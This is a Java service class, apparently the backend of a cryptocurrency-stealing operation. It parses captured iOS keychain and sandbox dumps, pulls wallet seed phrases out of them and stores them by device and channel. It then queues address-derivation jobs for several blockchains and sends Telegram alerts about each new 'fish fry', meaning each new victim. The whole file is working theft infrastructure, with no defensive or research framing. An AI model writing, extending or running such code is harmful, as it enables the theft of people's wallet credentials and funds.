package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.MnemonicDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.MnemonicEntity;
import com.consumer.util.MnemonicAesUtil;
import com.consumer.util.RedisPush;

import lombok.extern.slf4j.Slf4j;

import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;

/**
 * parse_ci 业务处理器（文档 §5.2）。
 * <p>
 * 职责：读取 war JSON → {@link MnemonicExtractor#extractAll} 提取所有钱包助记词
 *       → AES-256 加密入库 → 推送 news4:tasks wallet_derive。
 * <p>
 * 从 CaptureDispatchService 拆分，与 war_unpack/nb_memorandum 解耦。
 */
@Service
@Slf4j
public class ParseCiHandler {

    @Resource
    private ConsumerProperties consumerProps;
    @Resource
    private MnemonicDao mnemonicDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private MnemonicExtractor mnemonicExtractor;
    @Resource
    private RedisPush redisPush;
    @Resource
    private MnemonicTelegramService mnemonicTelegramService;

    private volatile SecretKeySpec aesKey;

    @PostConstruct
    public void initAesKey() {
        try {
            this.aesKey = MnemonicAesUtil.resolveKey(consumerProps.getMnemonicAesKey());
            if (this.aesKey == null) {
                log.info("【parse_ci】mnemonic-aes-key 未配置，助记词明文入库");
            }
        } catch (Exception e) {
            log.error("initAesKey FAIL: {}", e.toString());
        }
    }

    /**
     * 处理 parse_ci 消息：
     * 读取 war JSON → 提取助记词 → 加密入库 → 推 news4:tasks wallet_derive。
     */
	@SuppressWarnings("unused")
	public boolean handle(Map<String, String> fields) throws Exception {
        String idStr = fields.get("ios18param_id");
        String unpackPath = nullToEmpty(fields.get("unpack_path"));
        String filePath = nullToEmpty(fields.get("file_path"));
        String deviceId = nullToEmpty(fields.get("device_id"));
        // 兜底：device_id 为空时从 file_path 文件名提取（格式 {device}_{sha16}_{size}.bin）
        if (deviceId.isEmpty() && !filePath.isEmpty()) {
            deviceId = extractDeviceFromPath(filePath);
            if (!deviceId.isEmpty()) {
                log.info("【parse_ci】device_id 从 file_path 兜底提取 id={} device={} file={}",
                        idStr, deviceId, filePath);
            }
        }
        long t0 = System.currentTimeMillis();
        log.info("【parse_ci】收到解析助记词任务 id={} device={} unpack_path={}",
                 idStr, deviceId, unpackPath);
        if (idStr == null || idStr.isEmpty()) {
            log.warn("【parse_ci】缺少 ios18param_id，跳过");
            return true;
        }
        Integer id = Integer.parseInt(idStr);

        // 提取助记词：有 unpack 先只扫磁盘（避免再读 1MB+ .bin）；磁盘无结果再读 bin 兜底
        List<MnemonicExtractor.PhraseResult> allPhrases = Collections.emptyList();
        long tRead = System.currentTimeMillis();
        long tParse = tRead;
        long tExtract = tRead;
        try {
            MnemonicExtractor.Ctx ctx = new MnemonicExtractor.Ctx(id, deviceId);
            if (!unpackPath.isEmpty()) {
                tExtract = System.currentTimeMillis();
                allPhrases = mnemonicExtractor.extractAll(null, unpackPath, ctx);
            }
            if (allPhrases.isEmpty() && !filePath.isEmpty()) {
                tRead = System.currentTimeMillis();
                byte[] binBytes = readSmallBin(filePath, 32 * 1024 * 1024);
                if (binBytes.length == 0) {
                    log.warn("【parse_ci】war JSON 文件为空或不存在 id={} file={}", id, filePath);
                }
                tParse = System.currentTimeMillis();
                String rawJson = new String(binBytes, StandardCharsets.UTF_8);
                Object parsedTop = JSON.parse(rawJson);
                if (parsedTop instanceof JSONObject) {
                    JSONObject top = (JSONObject) parsedTop;
                    if (!top.containsKey("keychain") && !top.containsKey("sandbox")) {
                        for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
                            Object inner = top.get(wrapKey);
                            if (inner instanceof JSONObject) {
                                JSONObject ij = (JSONObject) inner;
                                if (ij.containsKey("keychain") || ij.containsKey("sandbox")) {
                                    top = ij;
                                    break;
                                }
                            }
                        }
                    }
                    tExtract = System.currentTimeMillis();
                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath, ctx);
                }
            } else if (unpackPath.isEmpty() && filePath.isEmpty()) {
                log.info("【parse_ci】提取完成 id={} 助记词数量=0 (file_path/unpack_path 均为空)", id);
            }
            long tDone = System.currentTimeMillis();
            log.info("【parse_ci】提取完成 id={} 助记词数量={} 耗时: 读文件={}ms 解析JSON={}ms 提取助记词={}ms 总计={}ms",
                    id, allPhrases.size(),
                    Math.max(0, tParse - tRead), Math.max(0, tExtract - tParse),
                    Math.max(0, tDone - tExtract), tDone - t0);
        } catch (Exception e) {
            log.warn("【parse_ci】提取失败 id={} err={}", id, e.toString());
        }
        double now = System.currentTimeMillis() / 1000.0;
        long tPersist0 = System.currentTimeMillis();
        // 循环外只查一次 device，避免 N 个助记词查 N 次 DB
        DeviceEntity deviceEntity = null;
        try { deviceEntity = deviceDao.findByDeviceid(deviceId); }
        catch (Exception e) { log.warn("【parse_ci】查询device失败 id={} device={} err={}", id, deviceId, e.toString()); }
        String channelcode = deviceEntity == null ? null : deviceEntity.getChannelCode();

        // 一次拉齐该 device 已有 source|hash，替代 N 次 findIdByDeviceSourceHash
        java.util.Set<String> existKeys = new java.util.HashSet<>();
        try {
            List<String> keys = mnemonicDao.listSourceHashKeysByDevice(deviceId);
            if (keys != null) existKeys.addAll(keys);
        } catch (Exception e) {
            log.warn("【parse_ci】批量幂等预查失败 id={} device={} err={}，降级逐条插入",
                    id, deviceId, e.toString());
        }

        int skippedExist = 0;
        int skippedDupInBatch = 0;
        List<MnemonicEntity> toInsert = new ArrayList<>(allPhrases.size());
        java.util.Set<String> batchInserted = new java.util.HashSet<>();
        for (MnemonicExtractor.PhraseResult r : allPhrases) {
            String phrasePlain = r.getPhrase();
            if (phrasePlain == null || phrasePlain.isEmpty()) continue;

            String phraseHash = sha256Hex(phrasePlain.getBytes(StandardCharsets.UTF_8));
            String batchKey = (r.getWallet() == null ? "" : r.getWallet().toLowerCase()) + "|" + phraseHash;
            if (!batchInserted.add(batchKey)) {
                skippedDupInBatch++;
                continue;
            }
            if (existKeys.contains(batchKey)) {
                skippedExist++;
                try {
                    mnemonicDao.incrementDupCount(deviceId, r.getWallet(), phraseHash);
                } catch (Exception ignore) {}
                continue;
            }

            String phraseEnc = aesEncrypt(phrasePlain);
            MnemonicEntity me = new MnemonicEntity();
            me.setDeviceId(deviceId);
            me.setWordscount(r.getWordCount());
            me.setChannelcode(channelcode);
            me.setResult(phraseEnc);
            me.setSource(r.getWallet());
            me.setStatus(1);
            me.setPhraseHash(phraseHash);
            me.setAddtime(now);
            toInsert.add(me);
        }

        int newlyInserted = 0;
        List<Map<String, String>> news4Jobs = new ArrayList<>(toInsert.size());
        if (!toInsert.isEmpty()) {
            boolean batchOk = false;
            try {
                mnemonicDao.insertBatch(toInsert);
                batchOk = true;
                newlyInserted = toInsert.size();
                // 个别驱动未回填 id 时，补一次按 hash 查 id，保证 news4 能入队
                for (MnemonicEntity me : toInsert) {
                    if (me.getId() != null) continue;
                    try {
                        Integer eid = mnemonicDao.findIdByDeviceSourceHash(
                                me.getDeviceId(), me.getSource(), me.getPhraseHash());
                        if (eid != null) me.setId(eid);
                    } catch (Exception ignore) {}
                }
            } catch (Exception e) {
                log.warn("【parse_ci】批量 insert 失败，降级逐条 id={} size={} err={}",
                        id, toInsert.size(), e.toString());
            }
            if (!batchOk) {
                for (MnemonicEntity me : toInsert) {
                    try {
                        mnemonicDao.insert(me);
                        newlyInserted++;
                    } catch (Exception e) {
                        // 并发下可能已被其他实例写入：记 dup，不入队派生
                        try {
                            mnemonicDao.incrementDupCount(me.getDeviceId(), me.getSource(), me.getPhraseHash());
                        } catch (Exception ignore) {}
                        log.warn("【parse_ci】mnemonic insert 跳过(可能重复) id={} source={} hash={} err={}",
                                id, me.getSource(), me.getPhraseHash(), e.toString());
                    }
                }
            }
            if (consumerProps.isNews4TaskEnabled()) {
                for (MnemonicEntity me : toInsert) {
                    if (me.getId() == null) continue;
                    Map<String, String> job = new HashMap<>();
                    job.put("job", "wallet_derive");
                    job.put("ios18param_id", String.valueOf(id));
                    job.put("mnemonic_id", String.valueOf(me.getId()));
                    job.put("device_id", firstNonEmpty(deviceId, ""));
                    job.put("phrase_hash", firstNonEmpty(me.getPhraseHash(), ""));
                    job.put("address_idx", "0");
                    job.put("chains", "tron,eth,bsc,btc,sol");
                    job.put("source", firstNonEmpty(me.getSource(), ""));
                    news4Jobs.add(job);
                }
            }
        }

        // 批量推送 news4:tasks（pipeline 单连接多 XADD）
        if (!news4Jobs.isEmpty()) {
            try {
                redisPush.notifyBatch(news4Jobs, consumerProps.getNews4Stream());
                log.info("【parse_ci】news4 wallet_derive 批量入队成功 count={} device={}", news4Jobs.size(), deviceId);
            } catch (Throwable t) {
                log.error("【parse_ci】enqueueWalletDerive batch FAIL device={} err={}", deviceId, t.toString());
            }
        }
        log.info("【parse_ci】入库完成 id={} inserted={} skip_exist={} skip_batch_dup={} persist={}ms news4_jobs={}",
                id, newlyInserted, skippedExist, skippedDupInBatch,
                System.currentTimeMillis() - tPersist0, news4Jobs.size());
        // 本批有新助记词入库 → 异步飞机「新鱼苗」通知（同批多 wallet 只发一次）
        if (newlyInserted > 0 && deviceEntity != null) {
            try {
                mnemonicTelegramService.notifyFishAsync(deviceEntity);
            } catch (Exception e) {
                log.warn("【parse_ci】新鱼苗通知提交失败 id={} device={} err={}", id, deviceId, e.toString());
            }
        }
        return true;
    }

    /** 入队 news4:tasks wallet_derive 
     * @param source */
    private void enqueueWalletDerive(Integer ios18paramId, String deviceId,
                                     String phraseHash, Integer mnemonicId, String source) {
        if (!consumerProps.isNews4TaskEnabled()) return;
        Map<String, String> job = new HashMap<>();
        job.put("job", "wallet_derive");
        job.put("ios18param_id", String.valueOf(ios18paramId));
        job.put("mnemonic_id", String.valueOf(mnemonicId));
        job.put("device_id", firstNonEmpty(deviceId, ""));
        job.put("phrase_hash", firstNonEmpty(phraseHash, ""));
        job.put("address_idx", "0");
        job.put("chains", "tron,eth,bsc,btc,sol");
        job.put("source", firstNonEmpty(source, ""));
        try {
            redisPush.notifySync(job, consumerProps.getNews4Stream());
            log.info("【parse_ci】news4 wallet_derive 入队成功 mnemonic_id={} device={}", mnemonicId, deviceId);
        } catch (Throwable t) {
            log.error("【parse_ci】enqueueWalletDerive FAIL device={} err={}", deviceId, t.toString());
        }
    }

    // ==================== 工具方法 ====================

    private String aesEncrypt(String plain) throws Exception {
        return MnemonicAesUtil.encodeForStorage(plain, this.aesKey);
    }

    private static byte[] readSmallBin(String path, int max) throws IOException {
        File f = new File(path);
        if (!f.exists()) return new byte[0];
        long len = f.length();
        if (len > max) len = max;
        try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
            byte[] buf = new byte[(int) len];
            int off = 0, read;
            while (off < buf.length && (read = in.read(buf, off, buf.length - off)) > 0) off += read;
            return buf;
        }
    }

    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    private static String sha256Hex(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                int v = b & 0xFF;
                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static String firstNonEmpty(String... arr) {
        for (String s : arr) if (s != null && !s.isEmpty()) return s;
        return null;
    }

    private static String nullToEmpty(String s) {
        return s == null ? "" : s;
    }

    /**
     * 从落盘文件路径提取 device UUID。
     * 文件名格式：{YYYYMMDD}/{kind}/{device}_{sha16}_{size}.bin
     * device 是第一个 _ 之前的部分，且必须是合法的 hex UUID（长度≥16，全 hex 大写）。
     */
    private static String extractDeviceFromPath(String filePath) {
        if (filePath == null || filePath.isEmpty()) return "";
        // 取最后一段路径（文件名）
        String name = filePath;
        int slash = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
        if (slash >= 0) name = filePath.substring(slash + 1);
        int dot = name.lastIndexOf('.');
        if (dot > 0) name = name.substring(0, dot);
        int us = name.indexOf('_');
        if (us <= 0) return "";
        String candidate = name.substring(0, us);
        // 校验：合法 device UUID 应为 hex 字符且长度≥16（典型 32 位 hex）
        if (candidate.length() < 16) return "";
        for (int i = 0; i < candidate.length(); i++) {
            char c = candidate.charAt(i);
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return "";
            }
        }
        return candidate;
    }
}
